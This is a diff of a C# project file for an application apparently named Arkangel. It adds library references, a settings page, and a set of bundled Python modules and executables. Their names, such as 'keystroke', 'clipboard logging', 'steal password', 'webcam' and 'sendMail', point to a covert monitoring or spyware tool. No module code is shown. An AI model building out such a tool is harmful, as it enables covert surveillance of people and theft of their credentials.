@@ -35,7 +35,13 @@
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
   </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
   <ItemGroup>
+    <Reference Include="DotNetZip">
+      <HintPath>D:\01.Students\01.School\term06\DoAnChuyenNganh\APP\Arkangel_ver02_01\packages\DotNetZip.1.10.1\lib\net20\DotNetZip.dll</HintPath>
+    </Reference>
     <Reference Include="Dragablz, Version=0.0.3.203, Culture=neutral, processorArchitecture=MSIL">
       <HintPath>..\packages\Dragablz.0.0.3.203\lib\net45\Dragablz.dll</HintPath>
     </Reference>
@@ -59,6 +65,12 @@
     </Reference>
     <Reference Include="MetroFramework.Fonts, Version=1.4.0.0, Culture=neutral, PublicKeyToken=5f91a84759bf584a, processorArchitecture=MSIL">
       <HintPath>..\packages\MetroModernUI.1.4.0.0\lib\net\MetroFramework.Fonts.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Azure.Mobile.Client, Version=4.0.2.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Azure.Mobile.Client.4.0.2\lib\net45\Microsoft.Azure.Mobile.Client.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=9.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.9.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
     </Reference>
     <Reference Include="System" />
     <Reference Include="System.ComponentModel.DataAnnotations" />
@@ -115,11 +127,15 @@
     <Compile Include="FTP_Server.xaml.cs">
       <DependentUpon>FTP_Server.xaml</DependentUpon>
     </Compile>
+    <Compile Include="Functions.cs" />
     <Compile Include="LoginForm.xaml.cs">
       <DependentUpon>LoginForm.xaml</DependentUpon>
     </Compile>
     <Compile Include="Screenshot.xaml.cs">
       <DependentUpon>Screenshot.xaml</DependentUpon>
+    </Compile>
+    <Compile Include="Setting.xaml.cs">
+      <DependentUpon>Setting.xaml</DependentUpon>
     </Compile>
     <Compile Include="Target.xaml.cs">
       <DependentUpon>Target.xaml</DependentUpon>
@@ -217,6 +233,10 @@
       <SubType>Designer</SubType>
       <Generator>MSBuild:Compile</Generator>
     </Page>
+    <Page Include="Setting.xaml">
+      <SubType>Designer</SubType>
+      <Generator>MSBuild:Compile</Generator>
+    </Page>
     <Page Include="Target.xaml">
       <SubType>Designer</SubType>
       <Generator>MSBuild:Compile</Generator>
@@ -264,7 +284,30 @@
       <Generator>ResXFileCodeGenerator</Generator>
       <LastGenOutput>Resources.Designer.cs</LastGenOutput>
     </EmbeddedResource>
+    <None Include="app.manifest" />
     <None Include="database.db" />
+    <None Include="Module_py\.gitattributes" />
+    <None Include="Module_py\active process.py" />
+    <None Include="Module_py\bookmark.py" />
+    <None Include="Module_py\clipboard logging.py" />
+    <None Include="Module_py\content filter.py" />
+    <None Include="Module_py\createdb.py" />
+    <None Include="Module_py\ftp.py" />
+    <None Include="Module_py\getsqldata.py" />
+    <None Include="Module_py\keystroke.py" />
+    <None Include="Module_py\launch.py" />
+    <None Include="Module_py\list_dir_file.py" />
+    <None Include="Module_py\notification.py" />
+    <None Include="Module_py\README.md" />
+    <None Include="Module_py\recent.py" />
+    <None Include="Module_py\scheduler.py" />
+    <None Include="Module_py\screenshot.py" />
+    <None Include="Module_py\sendMail.py" />
+    <None Include="Module_py\shutdown_restart.py" />
+    <None Include="Module_py\steal password.py" />
+    <None Include="Module_py\watch_file_folder.py" />
+    <None Include="Module_py\webcam.py" />
+    <None Include="Module_py\website usage.py" />
     <None Include="packages.config" />
     <None Include="Properties\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
@@ -277,6 +320,13 @@
   <ItemGroup>
     <Resource Include="Sources\34054291_1039096782920609_216488157267361792_n.png" />
     <Resource Include="Sources\logo_LSC_icon.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="module\ftp.exe" />
+    <Content Include="module\keystroke.exe" />
+    <Content Include="module\screenshot.exe" />
+    <Content Include="module\sendMail.exe" />
+    <Content Include="module\webcam.exe" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <Import Project="..\packages\System.Data.SQLite.Core.1.0.108.0\build\net46\System.Data.SQLite.Core.targets" Condition="Exists('..\packages\System.Data.SQLite.Core.1.0.108.0\build\net46\System.Data.SQLite.Core.targets')" />
